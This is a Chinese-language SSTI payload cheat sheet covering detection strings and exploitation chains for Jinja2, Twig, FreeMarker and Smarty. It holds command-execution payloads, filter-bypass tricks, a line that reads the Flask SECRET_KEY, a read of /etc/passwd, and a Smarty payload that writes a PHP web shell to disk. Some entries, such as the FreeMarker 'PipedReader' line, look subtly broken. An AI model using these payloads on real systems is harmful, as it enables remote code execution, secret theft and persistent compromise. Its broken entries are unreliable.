# SSTI模板注入

SSTI（Server-Side Template Injection，服务端模板注入）发生在服务端渲染模板时拼接了用户输入。

### 4.1 检测与识别

```python
# SSTI检测Payload
ssti_detection = [
    # 通用检测
    "{{7*7}}",        # → 49 → Jinja2/Twig
    "${7*7}",         # → 49 → FreeMarker/Velocity
    "#{7*7}",         # → 49 → Ruby ERB
    "<%= 7*7 %>",     # → 49 → ERB/EJS
    "{{7*'7'}}",      # → 7777777 → Jinja2
    "{{7*'7'}}",      # → 49 → Twig
    
    # 各框架特征检测
    "{{ ''.__class__ }}",                    # Jinja2
    "{{ request.application.__globals__ }}", # Jinja2 Flask
    "{{ _self }}",                           # Twig
    "{{ ''.__class__ }}",                    # Twig (报错)
    "#{ ''.__class__ }",                     # FreeMarker (报错)
]
```

### 4.2 Jinja2（Python Flask）

```python
# Jinja2 SSTI利用链

# 1. 获取基础类
{{ ''.__class__ }}                    # <class 'str'>
{{ ''.__class__.__mro__ }}           # 查看继承链
{{ ''.__class__.__mro__[1] }}        # <class 'object'>

# 2. 获取所有子类
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 3. 找到os模块并执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}

# 4. 利用config对象（Flask）
{{ config }}                          # 查看Flask配置
{{ config.SECRET_KEY }}              # 获取密钥
{{ config.items() }}                 # 获取所有配置

# 5. 利用lipsum
{{ lipsum.__globals__['os'].popen('id').read() }}

# 6. 利用cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 7. 过滤绕过
# 下划线被过滤 → 使用 attr 或 []
{{ ''['__class__'] }}                # 点号变下标
{{ ''|attr('__class__') }}          # attr过滤器
# 关键字被过滤 → 字符串拼接
{{ ''['__cl'+'ass__'] }}
# 引号被过滤 → chr拼接
{{ ().__doc__ }}                     # 利用__doc__中的字符
```

### 4.3 Twig（PHP）

```php
// Twig SSTI利用

// 基本执行
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Twig 2.x
{{["id"]|map("system")}}

// 过滤后利用
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### 4.4 Freemarker（Java）

```java
// Freemarker SSTI利用

// 命令执行
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}

// 读取文件
<#assign is=cmd?new("freemarker.template.utility.Execute")("cat /etc/passwd")>

// 绕过过滤
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder$PipedReader")()}
```

### 4.5 Smarty（PHP）

```php
// Smarty SSTI利用

// 命令执行
{system('id')}
{Smarty_Internal_Writefile::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",get_current_user())}

// 获取配置
{$smarty.version}
```

---

---

